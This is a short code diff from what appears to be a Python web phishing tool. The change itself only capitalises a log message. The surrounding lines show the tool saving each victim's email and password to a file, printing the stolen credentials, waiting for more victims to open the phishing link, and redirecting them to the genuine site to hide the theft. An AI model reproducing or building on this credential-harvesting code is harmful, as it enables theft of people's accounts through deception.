@@ -29,7 +29,7 @@ def submit():
             f.write(f"{selected_site}.com | ID: {email} | Password: {password}\n" + "-" * 100 + "\n")
         # Display victim's credentials
         phishing_tool_instance.update_output(f" [ * ] Victim {len(victim_list)} account id: {email}, password: {password}")
-        phishing_tool_instance.update_output(" [ + ] saved in captured.db")
+        phishing_tool_instance.update_output(" [ + ] Saved in captured.db")
         phishing_tool_instance.update_output(" [ * ] Waiting for other victim to open the link...")
         # Redirect to selected site
         return redirect(f"http://{selected_site}.com")
